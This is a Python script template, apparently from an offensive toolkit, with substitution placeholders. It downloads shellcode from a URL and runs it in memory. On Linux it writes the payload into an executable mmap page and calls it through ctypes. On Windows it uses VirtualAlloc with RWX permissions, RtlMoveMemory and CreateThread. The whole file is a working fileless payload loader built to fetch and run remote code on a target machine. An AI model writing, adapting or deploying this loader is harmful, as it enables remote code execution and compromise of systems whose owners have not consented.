#!/bin/python
import sys
import mmap
import ctypes
import time
import base64
import argparse
try:
    from urllib.request import urlopen
except:
    from urllib import urlopen

%libtransform%

is64 = sys.maxsize > 2**32

def downloader(shellcode_url):
    print("[+] Downloading shellcode...")
    data = urlopen(shellcode_url).read()
    shellcode = bytearray(data)
    file_size = len(shellcode)
    print("[+] %s Bytes Downloaded!" % (file_size))
    return shellcode

def write_linux(shellcode):
    shellcode = shellcode.decode('unicode_escape').encode("raw_unicode_escape")
    mm = mmap.mmap(
            -1,
            mmap.PAGESIZE,
            mmap.MAP_SHARED,
            mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC,
            )
    time.sleep(1)
    print("[+] Running shellcode in memory...")
    mm.write(shellcode)

    ptr = int.from_bytes(ctypes.string_at(id(mm) + 16, 8), "little")

    functype = ctypes.CFUNCTYPE(ctypes.c_void_p)
    fn = functype(ptr)
    time.sleep(2)
    fn()

def run(shellcode):
    shellcode = shellcode.decode('unicode_escape').encode("raw_unicode_escape")
    kernel32 = ctypes.windll.kernel32
    length = len(shellcode)

    time.sleep(1)

    print("[+] Running shellcode in memory...")

    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)

    buf = (ctypes.c_char * len(shellcode)).from_buffer_copy(shellcode)

    kernel32.RtlMoveMemory.argtypes = (ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t)
    kernel32.RtlMoveMemory(ptr, buf, length)

    time.sleep(2)

    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_void_p(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(ht, -1)

%code%
